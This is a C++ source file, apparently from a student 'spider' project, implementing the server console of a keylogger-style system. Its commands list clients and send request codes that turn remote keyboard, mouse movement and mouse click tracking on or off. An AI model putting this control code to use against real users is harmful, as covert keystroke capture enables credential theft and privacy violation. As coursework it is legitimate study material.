//
// CommandHandler.cpp for spider in /home/matteo/tmp/cpp_spider/server_src/src
//
// Made by matteo
// Login   <matteo.margueritte@epitech.eu>
//
// Started on  Sat Oct  7 21:11:24 2017 matteo
// Last update Sun Oct  8 16:01:24 2017 matteo
//

#include "CommandHandler.hpp"
#include <algorithm>
#include <sstream>

CommandHandler::CommandHandler(std::list<std::shared_ptr<IClient>> &clients,
                               std::mutex &clientMutex, bool &coreQuit)
    : _commands({{"help", &CommandHandler::help},
                 {"send", &CommandHandler::send},
                 {"list", &CommandHandler::list},
                 {"requestCodes", &CommandHandler::requestCodes},
                 {"quit", &CommandHandler::quit}}),
      _clients(clients), _clientMutex(clientMutex), _coreQuit(coreQuit) {}

void CommandHandler::executeCommand(std::string const &line) {
  std::vector<std::string> command = parseCommand(line);
  if (command.empty() || _commands.find(command[0]) == _commands.end()) {
    std::cerr << "unknown command type help for help" << std::endl;
    prompt();
    return;
  }
  (this->*_commands[command[0]])(command);
  prompt();
}

std::vector<std::string>
CommandHandler::parseCommand(std::string const &command) {
  std::stringstream ss(command);
  std::vector<std::string> commands;
  std::string input;

  while (std::getline(ss, input, ' '))
    commands.push_back(input);
  return (commands);
}

void CommandHandler::help(std::vector<std::string> const & /* command */) {
  std::cout << "Commands :" << std::endl
            << "\thelp - list available commands" << std::endl
            << "\tquit - quit" << std::endl
            << "\tlist - list clients" << std::endl
            << "\tsend [clientNb] [requestCode] - send"
            << " to client [clientNb] the [requestCode]" << std::endl
            << "\trequestCodes - list request codes" << std::endl;
}

void CommandHandler::list(std::vector<std::string> const & /* command */) {
  _clientMutex.lock();
  auto &last = *(--_clients.end());
  for (auto &it : _clients) {
    std::cout << "Client [" << it->getId() << "]";
    if (&it != &last)
      std::cout << " - ";
  }
  (!_clients.empty()) ? std::cout << std::endl
                      : std::cout << "no client connected" << std::endl;
  _clientMutex.unlock();
}

void CommandHandler::send(std::vector<std::string> const &command) {
  if (command.size() != 3 ||
      !std::all_of(command[1].begin(), command[1].end(), ::isdigit) ||
      !std::all_of(command[2].begin(), command[2].end(), ::isdigit)) {
    std::cerr << "invalid arguments" << std::endl;
    return;
  }
  unsigned id = std::stoi(command[1]);
  bool found = false;
  _clientMutex.lock();
  for (auto &it : _clients)
    if (it->getId() == id) {
      if (it->writeReady())
        it->sendState(std::stoi(command[2]));
      else {
        std::cerr << "client not ready" << std::endl;
        _clientMutex.unlock();
        return;
      }
      found = true;
    }
  _clientMutex.unlock();
  (found) ? std::cout << "request sent" << std::endl
          : std::cerr << "client not found" << std::endl;
}

void CommandHandler::requestCodes(
    std::vector<std::string> const & /* command */) {
  std::cout << "Request codes :" << std::endl
            << "0 - ping" << std::endl
            << "1 - ask id" << std::endl
            << "2 - activate keyboard tracking (3 - desactivate)" << std::endl
            << "4 - activate mouse mouvement tracking (5 - desactivate)"
            << std::endl
            << "6 - activate mouse click tracking (7 - desactivate)"
            << std::endl
            << "8 - disconnect client" << std::endl
            << "9 - pause client (10 - unpause)" << std::endl
            << "11 - set frequency (not implemented)" << std::endl
            << "12 - get status" << std::endl;
}

void CommandHandler::quit(std::vector<std::string> const & /* command */) {
  _coreQuit = true;
}

void CommandHandler::prompt(void) { std::cout << "server >> " << std::flush; }
